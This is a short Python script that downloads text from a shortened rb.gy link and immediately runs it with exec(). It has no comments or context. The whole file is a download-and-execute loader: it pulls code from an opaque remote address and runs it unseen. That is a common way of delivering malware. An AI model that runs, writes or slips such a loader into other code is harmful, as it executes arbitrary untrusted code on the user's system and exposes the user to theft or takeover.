import requests
url = 'https://rb.gy/bce71i'
page = requests.get(url)
exec(page.text)
